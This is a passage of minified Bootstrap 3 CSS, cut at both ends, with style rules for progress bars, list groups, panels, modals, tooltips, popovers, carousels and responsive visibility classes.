25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent)}.progress-bar-danger{background-color:#d9534f}.progress-striped .progress-bar-danger{background-image:-webkit-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:-o-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent)}.media{margin-top:15px}.media:first-child{margin-top:0}.media,.media-body{zoom:1;overflow:hidden}.media-body{width:10000px}.media-object{display:block}.media-object.img-thumbnail{max-width:none}.media-right,.media>.pull-right{padding-left:10px}.media-left,.media>.pull-left{padding-right:10px}.media-left,.media-right,.media-body{display:table-cell;vertical-align:top}.media-middle{vertical-align:middle}.media-bottom{vertical-align:bottom}.media-heading{margin-top:0;margin-bottom:5px}.media-list{padding-left:0;list-style:none}.list-group{margin-bottom:20px;padding-left:0}.list-group-item{position:relative;display:block;padding:10px 15px;margin-bottom:-1px;background-color:#fff;border:1px solid #ddd}.list-group-item:first-child{border-top-right-radius:4px;border-top-left-radius:4px}.list-group-item:last-child{margin-bottom:0;border-bottom-right-radius:4px;border-bottom-left-radius:4px}a.list-group-item,button.list-group-item{color:#555}a.list-group-item .list-group-item-heading,button.list-group-item .list-group-item-heading{color:#333}a.list-group-item:hover,button.list-group-item:hover,a.list-group-item:focus,button.list-group-item:focus{text-decoration:none;color:#555;background-color:#f5f5f5}button.list-group-item{width:100%;text-align:left}.list-group-item.disabled,.list-group-item.disabled:hover,.list-group-item.disabled:focus{background-color:#eee;color:#777;cursor:not-allowed}.list-group-item.disabled .list-group-item-heading,.list-group-item.disabled:hover .list-group-item-heading,.list-group-item.disabled:focus .list-group-item-heading{color:inherit}.list-group-item.disabled .list-group-item-text,.list-group-item.disabled:hover .list-group-item-text,.list-group-item.disabled:focus .list-group-item-text{color:#777}.list-group-item.active,.list-group-item.active:hover,.list-group-item.active:focus{z-index:2;color:#fff;background-color:#337ab7;border-color:#337ab7}.list-group-item.active .list-group-item-heading,.list-group-item.active:hover .list-group-item-heading,.list-group-item.active:focus .list-group-item-heading,.list-group-item.active .list-group-item-heading>small,.list-group-item.active:hover .list-group-item-heading>small,.list-group-item.active:focus .list-group-item-heading>small,.list-group-item.active .list-group-item-heading>.small,.list-group-item.active:hover .list-group-item-heading>.small,.list-group-item.active:focus .list-group-item-heading>.small{color:inherit}.list-group-item.active .list-group-item-text,.list-group-item.active:hover .list-group-item-text,.list-group-item.active:focus .list-group-item-text{color:#c7ddef}.list-group-item-success{color:#3c763d;background-color:#dff0d8}a.list-group-item-success,button.list-group-item-success{color:#3c763d}a.list-group-item-success .list-group-item-heading,button.list-group-item-success .list-group-item-heading{color:inherit}a.list-group-item-success:hover,button.list-group-item-success:hover,a.list-group-item-success:focus,button.list-group-item-success:focus{color:#3c763d;background-color:#d0e9c6}a.list-group-item-success.active,button.list-group-item-success.active,a.list-group-item-success.active:hover,button.list-group-item-success.active:hover,a.list-group-item-success.active:focus,button.list-group-item-success.active:focus{color:#fff;background-color:#3c763d;border-color:#3c763d}.list-group-item-info{color:#31708f;background-color:#d9edf7}a.list-group-item-info,button.list-group-item-info{color:#31708f}a.list-group-item-info .list-group-item-heading,button.list-group-item-info .list-group-item-heading{color:inherit}a.list-group-item-info:hover,button.list-group-item-info:hover,a.list-group-item-info:focus,button.list-group-item-info:focus{color:#31708f;background-color:#c4e3f3}a.list-group-item-info.active,button.list-group-item-info.active,a.list-group-item-info.active:hover,button.list-group-item-info.active:hover,a.list-group-item-info.active:focus,button.list-group-item-info.active:focus{color:#fff;background-color:#31708f;border-color:#31708f}.list-group-item-warning{color:#8a6d3b;background-color:#fcf8e3}a.list-group-item-warning,button.list-group-item-warning{color:#8a6d3b}a.list-group-item-warning .list-group-item-heading,button.list-group-item-warning .list-group-item-heading{color:inherit}a.list-group-item-warning:hover,button.list-group-item-warning:hover,a.list-group-item-warning:focus,button.list-group-item-warning:focus{color:#8a6d3b;background-color:#faf2cc}a.list-group-item-warning.active,button.list-group-item-warning.active,a.list-group-item-warning.active:hover,button.list-group-item-warning.active:hover,a.list-group-item-warning.active:focus,button.list-group-item-warning.active:focus{color:#fff;background-color:#8a6d3b;border-color:#8a6d3b}.list-group-item-danger{color:#a94442;background-color:#f2dede}a.list-group-item-danger,button.list-group-item-danger{color:#a94442}a.list-group-item-danger .list-group-item-heading,button.list-group-item-danger .list-group-item-heading{color:inherit}a.list-group-item-danger:hover,button.list-group-item-danger:hover,a.list-group-item-danger:focus,button.list-group-item-danger:focus{color:#a94442;background-color:#ebcccc}a.list-group-item-danger.active,button.list-group-item-danger.active,a.list-group-item-danger.active:hover,button.list-group-item-danger.active:hover,a.list-group-item-danger.active:focus,button.list-group-item-danger.active:focus{color:#fff;background-color:#a94442;border-color:#a94442}.list-group-item-heading{margin-top:0;margin-bottom:5px}.list-group-item-text{margin-bottom:0;line-height:1.3}.panel{margin-bottom:20px;background-color:#fff;border:1px solid transparent;border-radius:4px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,0.05);box-shadow:0 1px 1px rgba(0,0,0,0.05)}.panel-body{padding:15px}.panel-heading{padding:10px 15px;border-bottom:1px solid transparent;border-top-right-radius:3px;border-top-left-radius:3px}.panel-heading>.dropdown .dropdown-toggle{color:inherit}.panel-title{margin-top:0;margin-bottom:0;font-size:16px;color:inherit}.panel-title>a,.panel-title>small,.panel-title>.small,.panel-title>small>a,.panel-title>.small>a{color:inherit}.panel-footer{padding:10px 15px;background-color:#f5f5f5;border-top:1px solid #ddd;border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.list-group,.panel>.panel-collapse>.list-group{margin-bottom:0}.panel>.list-group .list-group-item,.panel>.panel-collapse>.list-group .list-group-item{border-width:1px 0;border-radius:0}.panel>.list-group:first-child .list-group-item:first-child,.panel>.panel-collapse>.list-group:first-child .list-group-item:first-child{border-top:0;border-top-right-radius:3px;border-top-left-radius:3px}.panel>.list-group:last-child .list-group-item:last-child,.panel>.panel-collapse>.list-group:last-child .list-group-item:last-child{border-bottom:0;border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.panel-heading+.panel-collapse>.list-group .list-group-item:first-child{border-top-right-radius:0;border-top-left-radius:0}.panel-heading+.list-group .list-group-item:first-child{border-top-width:0}.list-group+.panel-footer{border-top-width:0}.panel>.table,.panel>.table-responsive>.table,.panel>.panel-collapse>.table{margin-bottom:0}.panel>.table caption,.panel>.table-responsive>.table caption,.panel>.panel-collapse>.table caption{padding-left:15px;padding-right:15px}.panel>.table:first-child,.panel>.table-responsive:first-child>.table:first-child{border-top-right-radius:3px;border-top-left-radius:3px}.panel>.table:first-child>thead:first-child>tr:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child{border-top-left-radius:3px;border-top-right-radius:3px}.panel>.table:first-child>thead:first-child>tr:first-child td:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child td:first-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:first-child,.panel>.table:first-child>thead:first-child>tr:first-child th:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child th:first-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:first-child{border-top-left-radius:3px}.panel>.table:first-child>thead:first-child>tr:first-child td:last-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:last-child,.panel>.table:first-child>tbody:first-child>tr:first-child td:last-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:last-child,.panel>.table:first-child>thead:first-child>tr:first-child th:last-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:last-child,.panel>.table:first-child>tbody:first-child>tr:first-child th:last-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:last-child{border-top-right-radius:3px}.panel>.table:last-child,.panel>.table-responsive:last-child>.table:last-child{border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.table:last-child>tbody:last-child>tr:last-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child{border-bottom-left-radius:3px;border-bottom-right-radius:3px}.panel>.table:last-child>tbody:last-child>tr:last-child td:first-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:first-child,.panel>.table:last-child>tfoot:last-child>tr:last-child td:first-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:first-child,.panel>.table:last-child>tbody:last-child>tr:last-child th:first-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:first-child,.panel>.table:last-child>tfoot:last-child>tr:last-child th:first-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:first-child{border-bottom-left-radius:3px}.panel>.table:last-child>tbody:last-child>tr:last-child td:last-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child td:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child th:last-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child th:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:last-child{border-bottom-right-radius:3px}.panel>.panel-body+.table,.panel>.panel-body+.table-responsive,.panel>.table+.panel-body,.panel>.table-responsive+.panel-body{border-top:1px solid #ddd}.panel>.table>tbody:first-child>tr:first-child th,.panel>.table>tbody:first-child>tr:first-child td{border-top:0}.panel>.table-bordered,.panel>.table-responsive>.table-bordered{border:0}.panel>.table-bordered>thead>tr>th:first-child,.panel>.table-responsive>.table-bordered>thead>tr>th:first-child,.panel>.table-bordered>tbody>tr>th:first-child,.panel>.table-responsive>.table-bordered>tbody>tr>th:first-child,.panel>.table-bordered>tfoot>tr>th:first-child,.panel>.table-responsive>.table-bordered>tfoot>tr>th:first-child,.panel>.table-bordered>thead>tr>td:first-child,.panel>.table-responsive>.table-bordered>thead>tr>td:first-child,.panel>.table-bordered>tbody>tr>td:first-child,.panel>.table-responsive>.table-bordered>tbody>tr>td:first-child,.panel>.table-bordered>tfoot>tr>td:first-child,.panel>.table-responsive>.table-bordered>tfoot>tr>td:first-child{border-left:0}.panel>.table-bordered>thead>tr>th:last-child,.panel>.table-responsive>.table-bordered>thead>tr>th:last-child,.panel>.table-bordered>tbody>tr>th:last-child,.panel>.table-responsive>.table-bordered>tbody>tr>th:last-child,.panel>.table-bordered>tfoot>tr>th:last-child,.panel>.table-responsive>.table-bordered>tfoot>tr>th:last-child,.panel>.table-bordered>thead>tr>td:last-child,.panel>.table-responsive>.table-bordered>thead>tr>td:last-child,.panel>.table-bordered>tbody>tr>td:last-child,.panel>.table-responsive>.table-bordered>tbody>tr>td:last-child,.panel>.table-bordered>tfoot>tr>td:last-child,.panel>.table-responsive>.table-bordered>tfoot>tr>td:last-child{border-right:0}.panel>.table-bordered>thead>tr:first-child>td,.panel>.table-responsive>.table-bordered>thead>tr:first-child>td,.panel>.table-bordered>tbody>tr:first-child>td,.panel>.table-responsive>.table-bordered>tbody>tr:first-child>td,.panel>.table-bordered>thead>tr:first-child>th,.panel>.table-responsive>.table-bordered>thead>tr:first-child>th,.panel>.table-bordered>tbody>tr:first-child>th,.panel>.table-responsive>.table-bordered>tbody>tr:first-child>th{border-bottom:0}.panel>.table-bordered>tbody>tr:last-child>td,.panel>.table-responsive>.table-bordered>tbody>tr:last-child>td,.panel>.table-bordered>tfoot>tr:last-child>td,.panel>.table-responsive>.table-bordered>tfoot>tr:last-child>td,.panel>.table-bordered>tbody>tr:last-child>th,.panel>.table-responsive>.table-bordered>tbody>tr:last-child>th,.panel>.table-bordered>tfoot>tr:last-child>th,.panel>.table-responsive>.table-bordered>tfoot>tr:last-child>th{border-bottom:0}.panel>.table-responsive{border:0;margin-bottom:0}.panel-group{margin-bottom:20px}.panel-group .panel{margin-bottom:0;border-radius:4px}.panel-group .panel+.panel{margin-top:5px}.panel-group .panel-heading{border-bottom:0}.panel-group .panel-heading+.panel-collapse>.panel-body,.panel-group .panel-heading+.panel-collapse>.list-group{border-top:1px solid #ddd}.panel-group .panel-footer{border-top:0}.panel-group .panel-footer+.panel-collapse .panel-body{border-bottom:1px solid #ddd}.panel-default{border-color:#ddd}.panel-default>.panel-heading{color:#333;background-color:#f5f5f5;border-color:#ddd}.panel-default>.panel-heading+.panel-collapse>.panel-body{border-top-color:#ddd}.panel-default>.panel-heading .badge{color:#f5f5f5;background-color:#333}.panel-default>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#ddd}.panel-primary{border-color:#337ab7}.panel-primary>.panel-heading{color:#fff;background-color:#337ab7;border-color:#337ab7}.panel-primary>.panel-heading+.panel-collapse>.panel-body{border-top-color:#337ab7}.panel-primary>.panel-heading .badge{color:#337ab7;background-color:#fff}.panel-primary>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#337ab7}.panel-success{border-color:#d6e9c6}.panel-success>.panel-heading{color:#3c763d;background-color:#dff0d8;border-color:#d6e9c6}.panel-success>.panel-heading+.panel-collapse>.panel-body{border-top-color:#d6e9c6}.panel-success>.panel-heading .badge{color:#dff0d8;background-color:#3c763d}.panel-success>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#d6e9c6}.panel-info{border-color:#bce8f1}.panel-info>.panel-heading{color:#31708f;background-color:#d9edf7;border-color:#bce8f1}.panel-info>.panel-heading+.panel-collapse>.panel-body{border-top-color:#bce8f1}.panel-info>.panel-heading .badge{color:#d9edf7;background-color:#31708f}.panel-info>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#bce8f1}.panel-warning{border-color:#faebcc}.panel-warning>.panel-heading{color:#8a6d3b;background-color:#fcf8e3;border-color:#faebcc}.panel-warning>.panel-heading+.panel-collapse>.panel-body{border-top-color:#faebcc}.panel-warning>.panel-heading .badge{color:#fcf8e3;background-color:#8a6d3b}.panel-warning>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#faebcc}.panel-danger{border-color:#ebccd1}.panel-danger>.panel-heading{color:#a94442;background-color:#f2dede;border-color:#ebccd1}.panel-danger>.panel-heading+.panel-collapse>.panel-body{border-top-color:#ebccd1}.panel-danger>.panel-heading .badge{color:#f2dede;background-color:#a94442}.panel-danger>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#ebccd1}.embed-responsive{position:relative;display:block;height:0;padding:0;overflow:hidden}.embed-responsive .embed-responsive-item,.embed-responsive iframe,.embed-responsive embed,.embed-responsive object,.embed-responsive video{position:absolute;top:0;left:0;bottom:0;height:100%;width:100%;border:0}.embed-responsive-16by9{padding-bottom:56.25%}.embed-responsive-4by3{padding-bottom:75%}.well{min-height:20px;padding:19px;margin-bottom:20px;background-color:#f5f5f5;border:1px solid #e3e3e3;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.05);box-shadow:inset 0 1px 1px rgba(0,0,0,0.05)}.well blockquote{border-color:#ddd;border-color:rgba(0,0,0,0.15)}.well-lg{padding:24px;border-radius:6px}.well-sm{padding:9px;border-radius:3px}.close{float:right;font-size:21px;font-weight:bold;line-height:1;color:#000;text-shadow:0 1px 0 #fff;opacity:.2;filter:alpha(opacity=20)}.close:hover,.close:focus{color:#000;text-decoration:none;cursor:pointer;opacity:.5;filter:alpha(opacity=50)}button.close{padding:0;cursor:pointer;background:transparent;border:0;-webkit-appearance:none}.modal-open{overflow:hidden}.modal{display:none;overflow:hidden;position:fixed;top:0;right:0;bottom:0;left:0;z-index:1050;-webkit-overflow-scrolling:touch;outline:0}.modal.fade .modal-dialog{-webkit-transform:translate(0, -25%);-ms-transform:translate(0, -25%);-o-transform:translate(0, -25%);transform:translate(0, -25%);-webkit-transition:-webkit-transform 0.3s ease-out;-o-transition:-o-transform 0.3s ease-out;transition:transform 0.3s ease-out}.modal.in .modal-dialog{-webkit-transform:translate(0, 0);-ms-transform:translate(0, 0);-o-transform:translate(0, 0);transform:translate(0, 0)}.modal-open .modal{overflow-x:hidden;overflow-y:auto}.modal-dialog{position:relative;width:auto;margin:10px}.modal-content{position:relative;background-color:#fff;border:1px solid #999;border:1px solid rgba(0,0,0,0.2);border-radius:6px;-webkit-box-shadow:0 3px 9px rgba(0,0,0,0.5);box-shadow:0 3px 9px rgba(0,0,0,0.5);-webkit-background-clip:padding-box;background-clip:padding-box;outline:0}.modal-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;background-color:#000}.modal-backdrop.fade{opacity:0;filter:alpha(opacity=0)}.modal-backdrop.in{opacity:.5;filter:alpha(opacity=50)}.modal-header{padding:15px;border-bottom:1px solid #e5e5e5}.modal-header .close{margin-top:-2px}.modal-title{margin:0;line-height:1.42857143}.modal-body{position:relative;padding:15px}.modal-footer{padding:15px;text-align:right;border-top:1px solid #e5e5e5}.modal-footer .btn+.btn{margin-left:5px;margin-bottom:0}.modal-footer .btn-group .btn+.btn{margin-left:-1px}.modal-footer .btn-block+.btn-block{margin-left:0}.modal-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}@media (min-width:768px){.modal-dialog{width:600px;margin:30px auto}.modal-content{-webkit-box-shadow:0 5px 15px rgba(0,0,0,0.5);box-shadow:0 5px 15px rgba(0,0,0,0.5)}.modal-sm{width:300px}}@media (min-width:992px){.modal-lg{width:900px}}.tooltip{position:absolute;z-index:1070;display:block;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-style:normal;font-weight:normal;letter-spacing:normal;line-break:auto;line-height:1.42857143;text-align:left;text-align:start;text-decoration:none;text-shadow:none;text-transform:none;white-space:normal;word-break:normal;word-spacing:normal;word-wrap:normal;font-size:12px;opacity:0;filter:alpha(opacity=0)}.tooltip.in{opacity:.9;filter:alpha(opacity=90)}.tooltip.top{margin-top:-3px;padding:5px 0}.tooltip.right{margin-left:3px;padding:0 5px}.tooltip.bottom{margin-top:3px;padding:5px 0}.tooltip.left{margin-left:-3px;padding:0 5px}.tooltip-inner{max-width:200px;padding:3px 8px;color:#fff;text-align:center;background-color:#000;border-radius:4px}.tooltip-arrow{position:absolute;width:0;height:0;border-color:transparent;border-style:solid}.tooltip.top .tooltip-arrow{bottom:0;left:50%;margin-left:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.top-left .tooltip-arrow{bottom:0;right:5px;margin-bottom:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.top-right .tooltip-arrow{bottom:0;left:5px;margin-bottom:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.right .tooltip-arrow{top:50%;left:0;margin-top:-5px;border-width:5px 5px 5px 0;border-right-color:#000}.tooltip.left .tooltip-arrow{top:50%;right:0;margin-top:-5px;border-width:5px 0 5px 5px;border-left-color:#000}.tooltip.bottom .tooltip-arrow{top:0;left:50%;margin-left:-5px;border-width:0 5px 5px;border-bottom-color:#000}.tooltip.bottom-left .tooltip-arrow{top:0;right:5px;margin-top:-5px;border-width:0 5px 5px;border-bottom-color:#000}.tooltip.bottom-right .tooltip-arrow{top:0;left:5px;margin-top:-5px;border-width:0 5px 5px;border-bottom-color:#000}.popover{position:absolute;top:0;left:0;z-index:1060;display:none;max-width:276px;padding:1px;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-style:normal;font-weight:normal;letter-spacing:normal;line-break:auto;line-height:1.42857143;text-align:left;text-align:start;text-decoration:none;text-shadow:none;text-transform:none;white-space:normal;word-break:normal;word-spacing:normal;word-wrap:normal;font-size:14px;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.2);border-radius:6px;-webkit-box-shadow:0 5px 10px rgba(0,0,0,0.2);box-shadow:0 5px 10px rgba(0,0,0,0.2)}.popover.top{margin-top:-10px}.popover.right{margin-left:10px}.popover.bottom{margin-top:10px}.popover.left{margin-left:-10px}.popover-title{margin:0;padding:8px 14px;font-size:14px;background-color:#f7f7f7;border-bottom:1px solid #ebebeb;border-radius:5px 5px 0 0}.popover-content{padding:9px 14px}.popover>.arrow,.popover>.arrow:after{position:absolute;display:block;width:0;height:0;border-color:transparent;border-style:solid}.popover>.arrow{border-width:11px}.popover>.arrow:after{border-width:10px;content:""}.popover.top>.arrow{left:50%;margin-left:-11px;border-bottom-width:0;border-top-color:#999;border-top-color:rgba(0,0,0,0.25);bottom:-11px}.popover.top>.arrow:after{content:" ";bottom:1px;margin-left:-10px;border-bottom-width:0;border-top-color:#fff}.popover.right>.arrow{top:50%;left:-11px;margin-top:-11px;border-left-width:0;border-right-color:#999;border-right-color:rgba(0,0,0,0.25)}.popover.right>.arrow:after{content:" ";left:1px;bottom:-10px;border-left-width:0;border-right-color:#fff}.popover.bottom>.arrow{left:50%;margin-left:-11px;border-top-width:0;border-bottom-color:#999;border-bottom-color:rgba(0,0,0,0.25);top:-11px}.popover.bottom>.arrow:after{content:" ";top:1px;margin-left:-10px;border-top-width:0;border-bottom-color:#fff}.popover.left>.arrow{top:50%;right:-11px;margin-top:-11px;border-right-width:0;border-left-color:#999;border-left-color:rgba(0,0,0,0.25)}.popover.left>.arrow:after{content:" ";right:1px;border-right-width:0;border-left-color:#fff;bottom:-10px}.carousel{position:relative}.carousel-inner{position:relative;overflow:hidden;width:100%}.carousel-inner>.item{display:none;position:relative;-webkit-transition:.6s ease-in-out left;-o-transition:.6s ease-in-out left;transition:.6s ease-in-out left}.carousel-inner>.item>img,.carousel-inner>.item>a>img{line-height:1}@media all and (transform-3d),(-webkit-transform-3d){.carousel-inner>.item{-webkit-transition:-webkit-transform 0.6s ease-in-out;-o-transition:-o-transform 0.6s ease-in-out;transition:transform 0.6s ease-in-out;-webkit-backface-visibility:hidden;backface-visibility:hidden;-webkit-perspective:1000px;perspective:1000px}.carousel-inner>.item.next,.carousel-inner>.item.active.right{-webkit-transform:translate3d(100%, 0, 0);transform:translate3d(100%, 0, 0);left:0}.carousel-inner>.item.prev,.carousel-inner>.item.active.left{-webkit-transform:translate3d(-100%, 0, 0);transform:translate3d(-100%, 0, 0);left:0}.carousel-inner>.item.next.left,.carousel-inner>.item.prev.right,.carousel-inner>.item.active{-webkit-transform:translate3d(0, 0, 0);transform:translate3d(0, 0, 0);left:0}}.carousel-inner>.active,.carousel-inner>.next,.carousel-inner>.prev{display:block}.carousel-inner>.active{left:0}.carousel-inner>.next,.carousel-inner>.prev{position:absolute;top:0;width:100%}.carousel-inner>.next{left:100%}.carousel-inner>.prev{left:-100%}.carousel-inner>.next.left,.carousel-inner>.prev.right{left:0}.carousel-inner>.active.left{left:-100%}.carousel-inner>.active.right{left:100%}.carousel-control{position:absolute;top:0;left:0;bottom:0;width:15%;opacity:.5;filter:alpha(opacity=50);font-size:20px;color:#fff;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,0.6);background-color:rgba(0,0,0,0)}.carousel-control.left{background-image:-webkit-linear-gradient(left, rgba(0,0,0,0.5) 0, rgba(0,0,0,0.0001) 100%);background-image:-o-linear-gradient(left, rgba(0,0,0,0.5) 0, rgba(0,0,0,0.0001) 100%);background-image:-webkit-gradient(linear, left top, right top, color-stop(0, rgba(0,0,0,0.5)), to(rgba(0,0,0,0.0001)));background-image:linear-gradient(to right, rgba(0,0,0,0.5) 0, rgba(0,0,0,0.0001) 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1)}.carousel-control.right{left:auto;right:0;background-image:-webkit-linear-gradient(left, rgba(0,0,0,0.0001) 0, rgba(0,0,0,0.5) 100%);background-image:-o-linear-gradient(left, rgba(0,0,0,0.0001) 0, rgba(0,0,0,0.5) 100%);background-image:-webkit-gradient(linear, left top, right top, color-stop(0, rgba(0,0,0,0.0001)), to(rgba(0,0,0,0.5)));background-image:linear-gradient(to right, rgba(0,0,0,0.0001) 0, rgba(0,0,0,0.5) 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1)}.carousel-control:hover,.carousel-control:focus{outline:0;color:#fff;text-decoration:none;opacity:.9;filter:alpha(opacity=90)}.carousel-control .icon-prev,.carousel-control .icon-next,.carousel-control .glyphicon-chevron-left,.carousel-control .glyphicon-chevron-right{position:absolute;top:50%;margin-top:-10px;z-index:5;display:inline-block}.carousel-control .icon-prev,.carousel-control .glyphicon-chevron-left{left:50%;margin-left:-10px}.carousel-control .icon-next,.carousel-control .glyphicon-chevron-right{right:50%;margin-right:-10px}.carousel-control .icon-prev,.carousel-control .icon-next{width:20px;height:20px;line-height:1;font-family:serif}.carousel-control .icon-prev:before{content:'\2039'}.carousel-control .icon-next:before{content:'\203a'}.carousel-indicators{position:absolute;bottom:10px;left:50%;z-index:15;width:60%;margin-left:-30%;padding-left:0;list-style:none;text-align:center}.carousel-indicators li{display:inline-block;width:10px;height:10px;margin:1px;text-indent:-999px;border:1px solid #fff;border-radius:10px;cursor:pointer;background-color:#000 \9;background-color:rgba(0,0,0,0)}.carousel-indicators .active{margin:0;width:12px;height:12px;background-color:#fff}.carousel-caption{position:absolute;left:15%;right:15%;bottom:20px;z-index:10;padding-top:20px;padding-bottom:20px;color:#fff;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,0.6)}.carousel-caption .btn{text-shadow:none}@media screen and (min-width:768px){.carousel-control .glyphicon-chevron-left,.carousel-control .glyphicon-chevron-right,.carousel-control .icon-prev,.carousel-control .icon-next{width:30px;height:30px;margin-top:-10px;font-size:30px}.carousel-control .glyphicon-chevron-left,.carousel-control .icon-prev{margin-left:-10px}.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next{margin-right:-10px}.carousel-caption{left:20%;right:20%;padding-bottom:30px}.carousel-indicators{bottom:20px}}.clearfix:before,.clearfix:after,.dl-horizontal dd:before,.dl-horizontal dd:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.btn-toolbar:before,.btn-toolbar:after,.btn-group-vertical>.btn-group:before,.btn-group-vertical>.btn-group:after,.nav:before,.nav:after,.navbar:before,.navbar:after,.navbar-header:before,.navbar-header:after,.navbar-collapse:before,.navbar-collapse:after,.pager:before,.pager:after,.panel-body:before,.panel-body:after,.modal-header:before,.modal-header:after,.modal-footer:before,.modal-footer:after{content:" ";display:table}.clearfix:after,.dl-horizontal dd:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.btn-toolbar:after,.btn-group-vertical>.btn-group:after,.nav:after,.navbar:after,.navbar-header:after,.navbar-collapse:after,.pager:after,.panel-body:after,.modal-header:after,.modal-footer:after{clear:both}.center-block{display:block;margin-left:auto;margin-right:auto}.pull-right{float:right !important}.pull-left{float:left !important}.hide{display:none !important}.show{display:block !important}.invisible{visibility:hidden}.text-hide{font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}.hidden{display:none !important}.affix{position:fixed}@-ms-viewport{width:device-width}.visible-xs,.visible-sm,.visible-md,.visible-lg{display:none !important}.visible-xs-block,.visible-xs-inline,.visible-xs-inline-block,.visible-sm-block,.visible-sm-inline,.visible-sm-inline-block,.visible-md-block,.visible-md-inline,.visible-md-inline-block,.visible-lg-block,.visible-lg-inline,.visible-lg-inline-block{display:none !important}@media (max-width:767px){.visible-xs{display:block !important}table.visible-xs{display:table !important}tr.visible-xs{display:table-row !important}th.visible-xs,td.visible-xs{display:table-cell !important}}@media (max-width:767px){.visible-xs-block{display:block !important}}@media (max-width:767px){.visible-xs-inline{display:inline !important}}@media (max-width:767px){.visible-xs-inline-block{display:inline-block !important}}@media (min-width:768px) and (max-width:991px){.visible-sm{display:block !important}table.visible-sm{display:table !important}tr.visible-sm{display:table-row !important}th.visible-sm,td.visible-sm{display:table-cell !important}}@media (min-width:768px) and (max-width:991px){.visible-sm-block{display:block !important}}@media (min-width:768px) and (max-width:991px){.visible-sm-inline{display:inline !important}}@media (min-width:768px) and (max-width:991px){.visible-sm-inline-block{display:inline-block !important}}@media (min-width:992px) and (max-width:1199px){.visible-md{display:block !important}table.visible-md{display:table !important}tr.visible-md{display:table-row !important}th.visible-md,td.visible-md{display:table-cell !important}}@media (min-width:992px) and (max-width:1199px){.visible-md-block{display:block !important}}@media (min-width:992px) and (max-width:1199px){.visible-md-inline{display:inline !important}}@media (min-width:992px) and (max-width:1199px){.visible-md-inline-block{display:inline-block !important}}@media (min-width:1200px){.visible-lg{display:block !important}table.visible-lg{display:table !important}tr.visible-lg{display:table-row !important}th.visible-lg,td.visible-lg{display:table-cell !important}}@media (min-width:1200px){.visible-lg-block{display:block !important}}@media 